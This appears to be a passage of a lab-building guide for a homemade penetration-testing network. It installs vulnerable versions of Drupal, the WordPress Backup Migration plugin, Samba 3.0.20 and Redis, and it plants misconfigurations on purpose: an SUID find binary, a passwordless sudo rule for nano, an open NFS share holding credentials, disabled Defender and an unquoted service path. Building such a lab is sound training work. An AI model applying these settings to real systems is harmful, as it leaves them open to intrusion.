```php
<?php
phpinfo();
?>
```

Then we check the php version : 

```bash
curl http://localhost/test.php | grep "PHP Version"
```
 
<img width="1434" height="833" alt="image" src="https://github.com/user-attachments/assets/ba9d3a5e-73aa-4e25-92c3-24b391bf7e02" />

Perfect this confirms it . 

Now if we try accessing the install.php we should get a 200 : 

<img width="1221" height="746" alt="image" src="https://github.com/user-attachments/assets/8e4d64ec-1ed6-4a64-b9e2-c3f70e8b1c1d" />

**Configuring the DB :**

First we create the Drupal database

Drupal stores its data (users, configuration, content, modules) inside MariaDB. We create a dedicated database and user for Drupal instead of using the MariaDB root account.

```sql
# We first open MariaDB:
 
sudo mysql

# Create the database:

CREATE DATABASE drupal;

# Create a database user:

CREATE USER 'drupaluser'@'localhost' IDENTIFIED BY 'DrupalPassword123!';

# Give Drupal permission to use the database:

GRANT ALL PRIVILEGES ON drupal.* TO 'drupaluser'@'localhost';

# Apply the changes:

FLUSH PRIVILEGES;
EXIT;
```

<img width="1031" height="551" alt="image" src="https://github.com/user-attachments/assets/e13590d2-0f72-4ba9-a6cf-7f14760c8e69" />

**Drupal Installation :**

Now to complete the installation , we should open our browser and navigate to localhost or /install.php : 

<img width="1144" height="561" alt="image" src="https://github.com/user-attachments/assets/060c495e-b696-4429-8c2c-92e41d071f93" />

For the Installation profile : we choose the stantard one : 

For the DB we will enter the DB we setup from earlier :

<img width="1045" height="566" alt="image" src="https://github.com/user-attachments/assets/1abff5eb-7bb2-409b-9d9d-63066bd0dae9" />

For the Site Information :

```bash
# Site name:
DirtyGeddon Lab

#Site email:
admin@isolate.local

# Administrator account !
Username:
admin

Password:
Password@123456789
```

<img width="1155" height="699" alt="image" src="https://github.com/user-attachments/assets/e93ed8ce-f11f-48c2-9ddd-e6956085317a" />

Once we hit Finish we should be able to navigate to our Drupal Website :

<img width="1242" height="795" alt="image" src="https://github.com/user-attachments/assets/940869a3-ab74-4586-a4e3-895299561384" />

We can also confirm the version by checking the file : "/var/www/html/drupal/includes/bootstrap.inc"

<img width="1294" height="324" alt="image" src="https://github.com/user-attachments/assets/c4fa6972-2a40-4f34-95d4-6635e859ea37" />

This confirms that we have Drupal7.57. We can also check this from our Kali machine but that's for another section . 

For now Box 2 is done , let's move to Box 3 : 


### Box 3 : Backup : 

#### ISO Installation : 

For this one we need a debian 13 machine , where we will configure WordPress . 

The link to downlaod the ISO image :

```
https://www.debian.org/download.fr.html
```

We first create the virtual machine (2 GB of RAM and 20 gb of disk 2 Processors should be more than enough) :

<img width="942" height="465" alt="image" src="https://github.com/user-attachments/assets/144f6ebf-ff17-477b-b73c-b8c691691645" />

Now we start the installation , this should be pretty straight forward :

<img width="926" height="274" alt="image" src="https://github.com/user-attachments/assets/8945dd11-1549-4bdc-8d53-ae97effc9648" />

For Hostname : 

<img width="1022" height="385" alt="image" src="https://github.com/user-attachments/assets/a8b0d235-f419-4b7d-af2a-36778d1bf295" />

Domain isn't needed for this one . 

<img width="990" height="347" alt="image" src="https://github.com/user-attachments/assets/286674d8-1444-492d-ab82-e5b1cb970a0c" />

Create you Root password , then a new user , we'll name it azerty : 

<img width="959" height="346" alt="image" src="https://github.com/user-attachments/assets/bc497d4e-bc97-45ba-af9c-519fa8f2d0e8" />

Password is azerty as well . 

Select your timezone , then for the Disk Partition , we slect to use the entire Disk : 

<img width="957" height="405" alt="image" src="https://github.com/user-attachments/assets/115e6919-cca7-4cc9-83a8-85b1fab84d1e" />

Then put all files in 1 partition : 

<img width="974" height="443" alt="image" src="https://github.com/user-attachments/assets/7aff6599-9230-4b86-9aae-a3dd05401658" />

Finally we Confirm the changes :

<img width="939" height="383" alt="image" src="https://github.com/user-attachments/assets/4887cd7b-d9d0-4286-ba17-3c49ae6fa8e4" />

For the extra installation media , we won't be needing that :

<img width="909" height="351" alt="image" src="https://github.com/user-attachments/assets/b54ebee3-7446-4a11-926c-abb45b9f837c" />

For the Mirror image , we choose debian.org :

<img width="900" height="475" alt="image" src="https://github.com/user-attachments/assets/2a5d28da-4f3e-4675-8aa2-37bc23f45501" />

No proxy is needed : 

<img width="1007" height="354" alt="image" src="https://github.com/user-attachments/assets/078d282a-ed57-4719-a31e-80d8cbef6d5d" />

We will install SSH so that we don't have to install open-ssh server later : 

<img width="980" height="493" alt="image" src="https://github.com/user-attachments/assets/474cf5cb-d56f-4bdf-ad41-db8bc93d7d5d" />

Install the Grub boot Loader :

<img width="963" height="351" alt="image" src="https://github.com/user-attachments/assets/314b6ad7-9f54-4faf-b869-f6edb8a73abd" />

We only have 1 partition :

<img width="898" height="395" alt="image" src="https://github.com/user-attachments/assets/0be0fc97-bf12-46d6-8a78-d6a5704a5b1e" />

Once everything is setup , we just reboot the machine :

<img width="1008" height="346" alt="image" src="https://github.com/user-attachments/assets/05e8becb-6194-40cf-8480-236095884c18" />

And our Debian Box is Ready :

<img width="1125" height="634" alt="image" src="https://github.com/user-attachments/assets/5c2e068e-26dd-4869-b4df-668e7ddd3852" />


#### Scenario  : 

##### FootHold : 

To obtain our initial foothold, we first need to deploy a WordPress instance before installing the vulnerable plugin.

There are two ways to do this. The first is to install and configure the entire environment manually by setting up the LAMP stack (Linux, Apache, MySQL, and PHP), followed by WordPress itself. Although this approach requires more work, it provides a better understanding of the application's architecture and the services on which it relies.

The second option is to use a preconfigured Docker image that already includes WordPress and its dependencies. This significantly speeds up the deployment process and allows us to focus directly on the exploitation phase.

In our case, we will begin with the manual installation to understand how the different components fit together. Afterwards, we will show how to achieve the same result using Docker for a faster and more reproducible setup.

**Installing WordPress** :

Our Debian 13 machine is already provisioned, so we can start by installing the components required to run WordPress. Like Drupal, WordPress relies on a classic LAMP stack: Linux, Apache, MySQL, and PHP.

First, update the package lists and install Apache, MariaDB, PHP, and the extensions commonly required by WordPress:

```bash
su - : Switching to root .
sudo apt update
sudo apt install apache2 mariadb-server \
php php-mysql php-gd php-xml \
php-mbstring php-curl php-zip \
libapache2-mod-php wget unzip -y
```

<img width="902" height="743" alt="image" src="https://github.com/user-attachments/assets/263bc0b9-7c61-482c-8fbd-d5e03f5b1915" />

Once the installation completes, verify that Apache and MariaDB are running:

```bash
sudo systemctl status apache2
sudo systemctl status mariadb
```

<img width="979" height="699" alt="image" src="https://github.com/user-attachments/assets/a1fd7de4-58e7-40ee-877c-5d3d5d9a7799" />

Both services should appear as active (running).

Next, we create the database that WordPress will use:

```bash
sudo mysql
```

Inside the DB :

```sql
CREATE DATABASE wordpress;

CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'Password.123456@';

# This gives the WordPress database user permission to fully manage the wordpress database.
GRANT ALL PRIVILEGES ON wordpress.* TO 'wpuser'@'localhost';

# This tells MariaDB to reload its privilege tables so the changes are applied immediately.
FLUSH PRIVILEGES;

EXIT;
```

<img width="960" height="523" alt="image" src="https://github.com/user-attachments/assets/3a59d71f-e8c9-4c53-8989-293eba8f5284" />

With the database configured, download the latest WordPress release and extract it into Apache's web root:

```bash
cd /tmp

wget https://wordpress.org/latest.tar.gz

tar -xzf latest.tar.gz

sudo mv wordpress /var/www/html/
```

<img width="952" height="408" alt="image" src="https://github.com/user-attachments/assets/eab70f34-811e-4e60-9fe5-0a9a74422617" />

Before accessing WordPress, we need to make sure that Apache has the correct permissions to read and serve the files.

On Debian-based systems, Apache runs by default as the `www-data` user. This is a dedicated low-privileged system account used by web services to reduce the impact of a potential compromise.

The WordPress files are located inside Apache's default web root:

```text
/var/www/html/
```

When Apache is running, any content placed inside this directory can be accessed through the web server. Therefore, we assign ownership of the WordPress directory to the Apache user:

```bash
sudo chown -R www-data:www-data /var/www/html/wordpress
```

Breaking down the command:

- `chown` → changes the owner of files and directories
- `-R` → applies the change recursively to all files and subdirectories
- `www-data:www-data` → sets both the user owner and group owner to Apache's account
- `/var/www/html/wordpress` → the WordPress installation directory

Next, we set the appropriate permissions:

```bash
sudo chmod -R 755 /var/www/html/wordpress
```

The `755` permission means:

- Owner (`www-data`) → read, write, execute
- Group → read and execute
- Others → read and execute

This allows Apache to access and serve the WordPress files while preventing unauthorized users from modifying them.

<img width="969" height="306" alt="image" src="https://github.com/user-attachments/assets/a7fdeeae-e526-460a-8a66-c17927392adc" />

Once Apache is running, it will serve files located under `/var/www/html/` by default. Therefore, the WordPress installation can be reached through:

```bash
http://localhost/wordpress
```

<img width="1092" height="734" alt="image" src="https://github.com/user-attachments/assets/6a789fc1-6b33-4932-8d43-839fb913d6c0" />

From here we just follow the Installation guide , it is pretty straight forward :

<img width="1001" height="498" alt="image" src="https://github.com/user-attachments/assets/e7184158-bc4a-46bb-943f-f00aa1566189" />

We just specify the DB user we created earlier for this : 

```text
Database Name: wordpress

Username: wpuser

Password: Password.123456@

Database Host: localhost

Table Prefix: wp_
```

<img width="1060" height="600" alt="image" src="https://github.com/user-attachments/assets/366723bc-04d1-4ed0-a891-634cff6e4cde" />

Finally we just start the Installation :

<img width="947" height="304" alt="image" src="https://github.com/user-attachments/assets/65892261-6b1c-4a84-a632-3c4408ee65d2" />

WordPress requires the creation of the first administrative account.

For this lab, we use the following values:

```text
Site Title: Isolate-corp

Username: wpadmin

Password: XVFT5PGUEN@24521D
Email: admin@isolate.local 
```

<img width="1125" height="634" alt="image" src="https://github.com/user-attachments/assets/d1ae8ddb-0e2b-47a0-9e2f-22112abab9b9" />

This account will be used to access the WordPress administration panel and install the vulnerable plugin required for the exploitation phase.

Since this instance is running locally as part of a vulnerable lab environment, we enable the option to discourage search engines from indexing the site.

After completing the installation, WordPress is ready and we can proceed with installing the vulnerable plugin version required for CVE-2023-6553.

<img width="967" height="474" alt="image" src="https://github.com/user-attachments/assets/a41737bf-d3e5-4a85-a050-82d1477147ef" />

We can now login to our admin panel :

<img width="1027" height="620" alt="image" src="https://github.com/user-attachments/assets/7594d58a-a5cb-4a06-9ed6-c54822179019" />

**Installing the Vulnerable Plugin**

The vulnerability affects version **1.3.7** of the Backup Migration plugin. Since WordPress only installs the latest version from the plugin repository by default, we need to manually upload the vulnerable release.

First, download the archived plugin version:

```bash
wget https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip
```

<img width="1083" height="412" alt="image" src="https://github.com/user-attachments/assets/a6f37be4-f081-454b-a75d-c3bb264de4d9" />

Next, log in to the WordPress administration panel and navigate to:

```text
Plugins → Add New Plugin → Upload Plugin
```

Upload the archive:

```text
backup-backup.1.3.7.zip
```

<img width="1342" height="618" alt="image" src="https://github.com/user-attachments/assets/d22e8f26-4ab0-4f09-bb2d-381c7f4ff235" />

Once activated, the vulnerable endpoint exposed by CVE-2023-6553 will be available.

<img width="1084" height="372" alt="image" src="https://github.com/user-attachments/assets/b0416dac-73ea-410d-b497-6499e733ed71" />

```text
http://localhost//wordpress/wp-content/plugins/backup-backup/
```

After installation, you can verify that the plugin is present by checking:

<img width="1279" height="595" alt="image" src="https://github.com/user-attachments/assets/2d9b65ea-9721-48b2-9c99-774a155fbee8" />

Perfect now our Initial Foothold is set . 

**Alternative Setup: Docker**

As an alternative to the manual installation, WordPress can also be deployed using Docker. This approach is significantly faster, as the web server, PHP runtime, and WordPress itself are already configured inside the container.

First, install Docker and Docker Compose:

```bash
sudo apt update
sudo apt install docker.io docker-compose -y
```

Then, enable and start the Docker service:

```bash
sudo systemctl enable --now docker
```

We can verify the installation with:

```bash
docker --version
docker-compose --version
```

At this point, the official WordPress image can be downloaded:

```bash
docker pull wordpress
```

Note that the image only contains WordPress and its dependencies, a separate MariaDB container is still required for a fully functional deployment. Nevertheless, Docker provides a quick and reproducible alternative to the manual installation process.

Next, create the following docker-compose.yml file:

```bash
services:
  db:
    image: mariadb:latest
    restart: always
    environment:
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wpuser
      MYSQL_PASSWORD: password
      MYSQL_ROOT_PASSWORD: rootpassword

  wordpress:
    image: wordpress:latest
    restart: always
    ports:
      - "80:80"
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wpuser
      WORDPRESS_DB_PASSWORD: password
      WORDPRESS_DB_NAME: wordpress

    depends_on:
      - db
```

Start the containers:

```bash
docker-compose up -d
```

Docker will automatically download the required images, create both containers, and configure the connection between WordPress and MariaDB.

<img width="1130" height="757" alt="image" src="https://github.com/user-attachments/assets/d7327e4d-f6de-4bcb-8d0b-d56dc78e29c7" />

The first error i got is just because of apache already running on port 80 from the manual installation :

```bash
sudo systemctl stop apache2
```

Once the deployment is complete, WordPress will be accessible at:

```bash
http://localhost 
```

<img width="1232" height="705" alt="image" src="https://github.com/user-attachments/assets/315885c5-9428-4d3b-8092-6fef6380d2c6" />

The remaining setup steps, creating the administrator account and installing the vulnerable Backup Migration plugin—are identical to the manual installation.

Now let's move on the PrivEsc path .

##### Priv Esc : 

For this box, the privilege escalation path relies on a deliberately misconfigured SUID binary.

SUID binaries execute with the privileges of their owner instead of the user who runs them. By assigning the SUID bit to a binary owned by root, we can make it execute with root privileges.

To simulate this misconfiguration, we assign the SUID permission to `/usr/bin/find`:


```bash
sudo chmod u+s /usr/bin/find
```

We can verify that the SUID bit is correctly applied:

```bash
ls -la /usr/bin/find
```

<img width="758" height="292" alt="image" src="https://github.com/user-attachments/assets/cae9f045-700d-41c8-adae-9e4e8baebee3" />

The output should contain an `s` in the owner's execute position:

```bash
-rwsr-xr-x 1 root root ... /usr/bin/find
```

Now, from the low-privileged `www-data` shell obtained during exploitation, we can abuse this SUID binary.

Using GTFOBins, we find a known privilege escalation method for `find`:

```text
https://gtfobins.github.io/
```

More on that in the attack phase .

For now The privilege escalation is complete.

Box 3 is setup , Moving on to Box4 . 


### Box 4 : ORNN : 

#### ISO Installation : 

For this one we will follow the same thing we did with Box3 . 

Just check The ISO Installation section on Box 3 . 

Of course we can just clone the Box3 , and not have to redo the entire installation : 

<img width="1392" height="670" alt="image" src="https://github.com/user-attachments/assets/4963fb57-68d4-4b9e-b32d-dca2fe5d6693" />

From there we select Full Clone , so that the machine is independent : 

<img width="1155" height="539" alt="image" src="https://github.com/user-attachments/assets/ef66101b-3c0b-46ca-8e08-cf2e8685d870" />

Finally we just change the name and hit Finish :

<img width="950" height="461" alt="image" src="https://github.com/user-attachments/assets/bf0c566d-37f2-4d5b-ac7e-5875b33e7e74" />

Once the clone is done , our machine should be setup :

<img width="1146" height="538" alt="image" src="https://github.com/user-attachments/assets/86dce6fb-f8af-45e8-b8dc-6f722f12297d" />

We won't need the Wordpress dependencies (Apache , Maria) so we will just turn off these services later . (keeping them doesn't affect the rest) . 


#### Scenario  : 


##### Foothold : 


**Setting up the NFS server :**

The first service on the bridge box is NFS. The goal is to create a shared directory that will act as the initial information leak point in the lab.

The share will contain a password-protected ZIP archive holding credentials for later stages of the attack chain. The NFS configuration will intentionally include a weak permission setting to reproduce a common infrastructure mistake.


**Installing NFS**

First, install the NFS server package:

```bash
sudo apt update
sudo apt install nfs-kernel-server -y
```

Then Enable and start the service:

```bash
sudo systemctl enable nfs-server
sudo systemctl start nfs-server
```

Verify that NFS is running:

```bash
sudo systemctl status nfs-server
```

<img width="935" height="341" alt="image" src="https://github.com/user-attachments/assets/c3080a9f-57d7-49f9-921b-63019baffc7f" />

**Creating the shared directory :**

First we create the directory that will be exposed through NFS:

```bash
sudo mkdir -p /srv/share
```

Then we set the permissions for the lab environment:

```bash
sudo chmod 777 /srv/share
```

The directory will now be used as the exported NFS share.

NFS (Network File System) works by exporting a local directory so that other machines (NFS clients) can mount it over the network. 

The file that controls which directories are shared and who can access them is */etc/exports*



```bash
sudo nano /etc/exports
```

Inside the File we add our share : 

```bash
/srv/share *(rw,sync,no_subtree_check,insecure)
```

Explanation:

- /srv/share → directory being shared
- * → allows any client to connect (use a specific IP in real env)
- rw → read/write access
- sync → ensures data is written safely before confirming
- no_subtree_check → improves performance and avoids path checking issues

We save the file then we apply the changes 

```bash
sudo /usr/sbin/exportfs -ra
sudo /usr/sbin/exportfs -v
```

<img width="1207" height="452" alt="image" src="https://github.com/user-attachments/assets/a27ef306-27a5-4665-a28f-2d4845930a96" />

Now our NFS is setup, if we wanted to check :

```bash
/usr/sbin/showmount -e localhost
```

<img width="551" height="218" alt="image" src="https://github.com/user-attachments/assets/f181e696-b23c-4ee9-8ed1-45abd088a379" />

**Creating the credential archive**

Inside the share, create the file that will contain the lab credentials.

Create a temporary directory:

```bash
mkdir ~/credentials
```

Add the credential file:

```bash
nano ~/credentials/windows-creds.txt
```

For the creds file :

```bash
Automation.txt

[Windows-DC]
Username: Administrator
Password: Password@123456789

[Backup-Service]
Username: svc_backup
Password: Backup@123

[Database]
Username: svc_database
Password: D6$yH1@wZ8!cM4^q
```

Then we ZIP the file with a password : 

```bash
zip -e ~/credentials/windows-creds.zip  ~/credentials/windows-creds.txt
```

<img width="929" height="319" alt="image" src="https://github.com/user-attachments/assets/a251e496-291b-459d-a76c-f61d127c8b19" />

Finally we should move the ZIP file to the NFS Share :

```bash
sudo mv ~/credentials/windows-creds.zip /srv/share/
```

**Setting Up Samba :**

First let's check if we got Samba :

```bash
dpkg -l | grep samba
```

<img width="1462" height="297" alt="image" src="https://github.com/user-attachments/assets/b0cae9f2-9a95-4b6f-8efd-a4d20e969c04" />

We don't have samba , the problem is that if we try downloading it via apt : 

```bash
sudo apt install samba
```

It would give us Samba 4.22.x, which is not vulnerable to CVE-2007-2447.

For this lab, we need to install Samba 3.0.20 specifically.

Then we install the Dependencies :

```bash
sudo apt update
sudo apt install -y build-essential wget tar libacl1-dev libldap2-dev libssl-dev
```

Next we download the samba version that is vulnerable : 

```bash
wget https://download.samba.org/pub/samba/stable/samba-3.0.20.tar.gz
tar -xvzf samba-3.0.20.tar.gz
```

<img width="1137" height="578" alt="image" src="https://github.com/user-attachments/assets/24b03825-10c5-44fd-bf96-9e7077d24c82" />

Now we go to samba-3.0.20/source :

```bash
cd samba-3.0.20/source
```

From there we configure and compile the source :

The build failed on a file handling disk quotas, written for an old Linux version that no longer matches ours. Since quota support isn't needed for this lab, we just told configure to skip it entirely instead of patching the old code :

```bash
make distclean
CFLAGS="-std=gnu89" ./configure --without-quotas --without-sys-quotas
make CFLAGS="-std=gnu89"
sudo make install
```

<img width="1107" height="461" alt="image" src="https://github.com/user-attachments/assets/e97bb9c9-8b6f-4f8c-a1e5-d6ad0fff2cbf" />

This builds Samba 3.0.20 from source since apt only gives us the patched modern version.

We create the runtime directories Samba expects :

```bash
bashsudo mkdir -p /usr/local/samba/var/locks
sudo mkdir -p /usr/local/samba/lib
```

**Configuring smb.conf :**

```bash
sudo nano /usr/local/samba/lib/smb.conf
```

Inside the File :

```bash
[global]
workgroup = WORKGROUP
netbios name = ORNN
security = user
map to guest = Bad User
username map script = /usr/local/samba/lib/username_map.sh
username map = /usr/local/samba/lib/username_map

[tmp]
path = /tmp
guest ok = yes
read only = no
browsable = yes
```

username map script is the vulnerable directive, it passes the client's username straight to a shell script.

Save and exit, then we create the map script itself :

```bash
sudo nano /usr/local/samba/lib/username_map.sh

# Inside of it :
#!/bin/bash
echo "$1"
```

Finally , we make it executable :

```bash
sudo chmod +x /usr/local/samba/lib/username_map.sh
```

We also need an empty map file so Samba doesn't complain on startup :

```bash
sudo touch /usr/local/samba/lib/username_map
```
Once that's done, tell me and we'll start smbd/nmbd and verify it's listening.

*Quick Note :* 

Downloading Samba 3.0.20 gives you the vulnerable code, but you still need to enable the feature that triggers it in your config. That's what we're doing with the smb.conf setup.

Now we just start the services :

```bash
sudo /usr/local/samba/sbin/smbd -D
sudo /usr/local/samba/sbin/nmbd -D
```

Then we can check the services :

```bash
ss -tlnp | grep -E '139|445'
```

We should see both ports open now : 

<img width="1005" height="336" alt="image" src="https://github.com/user-attachments/assets/9e2633a4-cbc8-417d-ae80-3989067ace78" />

Now The Samba service is all set . 


**Configuring Redis :**

Install Redis from the repos (we need the server, not just the CLI) :

```bash
sudo apt update
sudo apt install redis-server -y
```

Open the main Redis config file to expose it on all network interfaces :

```bash
sudo nano /etc/redis/redis.conf
```

Make sure you modify : 

```bash
bind 0.0.0.0
protected-mode no
```

<img width="960" height="541" alt="image" src="https://github.com/user-attachments/assets/4df96142-4303-42d9-905e-2b5175124ed7" />

From there we restart the service :

```bash
sudo systemctl restart redis-server
```

This version has too much restrictions for arbitrary file write via CONFIG SET, so i used an older version :

Download and compile Redis 3.2.13 (older version without protected-config restrictions) :

```bash
cd ~
wget http://download.redis.io/releases/redis-3.2.13.tar.gz
tar -xvzf redis-3.2.13.tar.gz
cd redis-3.2.13
make
sudo make install
```

This builds Redis 3.2.13 from source, which is vulnerable to arbitrary file write via CONFIG SET without the modern restrictions.

Now we first make a directory for the config and one for where the DB will actually live :

```bash
sudo mkdir -p /usr/local/redis/etc
sudo mkdir -p /var/lib/redis
```

Now create the config file at `/usr/local/redis/etc/redis.conf`. Keep the server dumb and normal  we just expose it, nothing more :

```bash
nano /usr/local/redis/etc/redis.conf

# Inside the file :

bind 0.0.0.0
protected-mode no
port 6379
dir /var/lib/redis
dbfilename dump.rdb
```

- `bind 0.0.0.0` exposes Redis on all interfaces.
- `protected-mode no` disables the safety guard preventing unauthorized connections.
- `dir` and `dbfilename` point at a normal, valid location — `/var/lib/redis/dump.rdb`.

Kill any old instance and start the vulnerable server. Run it in the **foreground** first (no `&`) so you can watch it boot cleanly instead of dying silently :

```bash
sudo pkill -f redis-server
sudo /usr/local/bin/redis-server /usr/local/redis/etc/redis.conf
```

<img width="1460" height="785" alt="image" src="https://github.com/user-attachments/assets/94e9e22e-438e-4307-9644-443b241b04f4" />

Once you see it come up healthy, `Ctrl+C` and relaunch it in the background :

```bash
sudo /usr/local/bin/redis-server /usr/local/redis/etc/redis.conf &
```

Verify it's actually listening :

```bash
redis-cli ping        # -> PONG
```

Last thing on the server side we create the `.ssh` folder for the `azerty` user with correct ownership and permissions, so that when the key gets injected later, SSH's `StrictModes` actually accepts it (an existing `.ssh` that's `700` and user owned is a normal, healthy SSH setup — we're not putting any key here yet) :

```bash
sudo mkdir -p /home/azerty/.ssh
sudo chown -R azerty:azerty /home/azerty/.ssh
sudo chmod 700 /home/azerty/.ssh
```

<img width="1382" height="740" alt="image" src="https://github.com/user-attachments/assets/303d6673-f50d-429e-b5cc-b47281cea74b" />

Now Redis is setup . 


##### PrivEsc : 

**Path 1: Samba CVE-2007-2447**

Direct unauthenticated RCE as root. No escalation needed ,you're already root.

**Path 2: NFS + svc_backup credentials**

Create the svc_backup user with a home directory (this user will be found in the NFS credentials) :

```bash
sudo useradd -m svc_backup
```

Set the password to "Backup@123" (this credential will be stored in the /srv/share/windows-creds.zip on the NFS share) :

```bash
sudo passwd svc_backup
```

Password can be anything , we're using : "Backup@123"

Give svc_backup sudo access to run nano without requiring a password. This is the misconfiguration that enables escalation :

```bash
sudo visudo
```

Add this line at the very end of the file :

```bash
svc_backup ALL=(ALL) NOPASSWD: /usr/bin/nano
```

Save and exit.

Verify the sudoers entry was added correctly :

```bash
sudo -l -U svc_backup
```

Should output that nano is allowed without a password.

<img width="1149" height="642" alt="image" src="https://github.com/user-attachments/assets/dfbb0b86-879d-4e7d-8c74-3d8eeb65eec0" />

Now the PrivEsc path is also done . Moving on to Box 5 . 

### Box 5 : Rogue : 

#### ISO Installation :

For this Box we will be using a Windows 10 machine . 

First go to the Microsoft Download page :

```text
https://www.microsoft.com/en-gb/software-download/windows10
```

Normally, Microsoft asks you to download the Media Creation Tool, which requires going through the installation process manually. 

Instead, there is a small trick that allows us to download the ISO directly.

First we open Browser's Tools --> Network Tab --> 3 dots --> More Tools --> Network Conditions :

<img width="1706" height="828" alt="image" src="https://github.com/user-attachments/assets/f39856d0-834a-4ed2-9051-c565a6ab044b" />

From there we uncheck the "User Browser Default" :

<img width="778" height="475" alt="image" src="https://github.com/user-attachments/assets/a06e8fc2-acd6-4734-b6e3-a0c9f0fa8e1a" />

After that we can modify it to anything else ,  we can choose Chrome OS . 

From there , we just refresh the page :

<img width="914" height="506" alt="image" src="https://github.com/user-attachments/assets/610bb694-7874-46a5-998f-0a787a60c981" />

Now we see that we can select the version we want to download : 

<img width="852" height="647" alt="image" src="https://github.com/user-attachments/assets/8541e74d-df4e-40a9-aa6f-ec1f9b34fa55" />

We choose Windows 10 since that's the only option available , then select the language :

<img width="977" height="429" alt="image" src="https://github.com/user-attachments/assets/6796fc1e-c06a-429c-9c69-48eebfd81179" />

Finally, select the x64 edition, as it matches the architecture of our machine then we just wait for it to install . 

Once the download is complete, create a new virtual machine:

<img width="907" height="527" alt="image" src="https://github.com/user-attachments/assets/349b1ed4-f90e-4750-af4a-87fa82768235" />

During the installation, select the Education edition. For the product key, simply leave the field empty.

<img width="987" height="536" alt="image" src="https://github.com/user-attachments/assets/6f678ad6-0d30-47a0-8157-3b6e7509bc8c" />

For Virtual Disk , We put everything in a single file .

We launch the machine and start our installation :

<img width="1063" height="554" alt="image" src="https://github.com/user-attachments/assets/9b2efcd9-a795-409c-b78b-b22f49d0d915" />

Once the Installation is done , we can login to our machine .  

<img width="1236" height="526" alt="image" src="https://github.com/user-attachments/assets/703fdb5e-bbfd-4207-847d-3b1e319b6641" />

Our Windows image is now ready, and we can start building the scenario.

#### Scenario :

##### Foothold : 

We first need to create the users that will be involved in the scenario.

Open a PowerShell terminal as Administrator and create the backup account:

```Powershell
net user svc_backup "Backup@123" /add
```

This account will later be discovered through the leaked credentials on the NFS share and will serve as our initial foothold on the machine.

Next, enable the built-in Administrator account:

```Powershell
net user Administrator /active:yes
```

We will also create our local administrative user:

```Powershell
net user elmehdi 123456789 /add
net localgroup Administrators elmehdi /add
```

<img width="881" height="429" alt="image" src="https://github.com/user-attachments/assets/11f37f4e-3c64-40fc-ab17-2cfe10d81579" />

Now that the users are in place, we can enable the remote services that will be used throughout the lab.

First, enable WinRM:

```Powershell
Enable-PSRemoting -Force
```

Then, add the backup account to the Remote Management Users group so that it can authenticate remotely:

```Powershell
net localgroup "Remote Management Users" svc_backup /add
```

Next, enable Remote Desktop:

```Powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
-Name fDenyTSConnections -Value 0
```

Enable the corresponding firewall rules for both of these services : 

For Winrm :

```powershell
Enable-NetFirewallRule -DisplayGroup "Windows Remote Management"
```

And for RDP :

```powershell
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

<img width="1055" height="408" alt="image" src="https://github.com/user-attachments/assets/6e5a7304-5bad-4ab0-a94e-6ee5bc700bca" />

To apply changes , we need to reboot the machine : 

Now, to verify that both WinRM and RDP are enabled, we can check the listening ports:

```bash
netstat -ano | findstr ":3389 :5985"
```

- 3389 corresponds to RDP.
- 5985 corresponds to WinRM over HTTP.

<img width="1051" height="287" alt="image" src="https://github.com/user-attachments/assets/ce4004cb-8498-46e2-b88c-31ccd7b942f0" />

Services are set as well . 

Now For the sake of the lab, Windows Defender and the real-time protection mechanisms will also be disabled so they do not interfere with the scenario.

The first thing we need to disable is Tamper Protection. This feature prevents administrators and scripts from modifying Microsoft Defender settings, even when running with elevated privileges.

To disable it, open Windows Security and navigate to:

```text
Virus & threat protection → Manage settings → Tamper Protection
```

<img width="1139" height="279" alt="image" src="https://github.com/user-attachments/assets/ec511c05-b35e-4029-839d-0333922bc074" />

Now that Tamper protection is off , we will be able to disable  AV using PS scripts , either we do it now , or until the attack phase : 

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
```

<img width="920" height="376" alt="image" src="https://github.com/user-attachments/assets/9173b460-9a4f-414c-8c0d-3aa3c62a289e" />

We can verify it using PS as well : 

```powershell
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableScriptScanning, MAPSReporting, SubmitSamplesConsent
```

<img width="1229" height="508" alt="image" src="https://github.com/user-attachments/assets/3c400043-2ffb-4ef0-a3ba-b55ba33e8f30" />

Now the Foothold is set . Let's move on to the privesc setup . 


##### Priv Esc : 

The privilege escalation path on this machine relies on a common Windows service misconfiguration: an unquoted service path.

Windows services running executables located in directories containing spaces should have their binary paths wrapped in quotation marks.

For example, a properly configured service path would look like:

```text
"C:\Program Files\Backup Service\backup.exe"
```

However, if the quotation marks are missing:

```text
C:\Program Files\Backup Service\backup.exe
```

Windows may interpret the path incorrectly and attempt to locate the executable by checking different possible paths.

This behavior becomes dangerous when a low-privileged user has both the ability to place an executable in one of the searched locations and the permission to restart the affected service.

When the service is restarted, Windows may execute the attacker-controlled binary with the privileges of the service account, resulting in privilege escalation.


**Creating the backup service executable :**


Before creating the vulnerable service, we first need a service executable.

Since the Windows machine is meant to resemble a normal enterprise endpoint, we do not install development tools on it. Instead, we build the executable on our Kali machine and only transfer the final binary to the Windows host.

For this, we use MinGW-w64 to cross-compile a Windows executable from Kali.

First, install the required compiler:

```bash
sudo apt update
sudo apt install mingw-w64 -y
```

Verify the installation : 

```bash
x86_64-w64-mingw32-gcc --version
```

From there we create a basic c file :

```c
#include <windows.h>

int main()
{
    while (1)
    {
        Sleep(1000);
    }

    return 0;
}
```

We then compile it into a Windows executable:

```bash
x86_64-w64-mingw32-gcc backup.c -o backup.exe -ladvapi32
```

Verify that the output is a Windows executable:

```bash
file backup.exe
```

The output should confirm that it is a Windows PE executable:

```bash
PE32+ executable (console) x86-64, for MS Windows
```

<img width="1036" height="834" alt="image" src="https://github.com/user-attachments/assets/7a570422-e279-4c59-a8a7-5a23b4094475" />


Now we transfer the executable to the Windows machine.

On Kali, start a simple HTTP server:

```bash
python3 -m http.server 80
```

On the Windows machine, download the executable:

Create the directory first : 

```bash
mkdir "C:\Program Files\Backup Service"
```

Then we transfer the executable :

```powershell
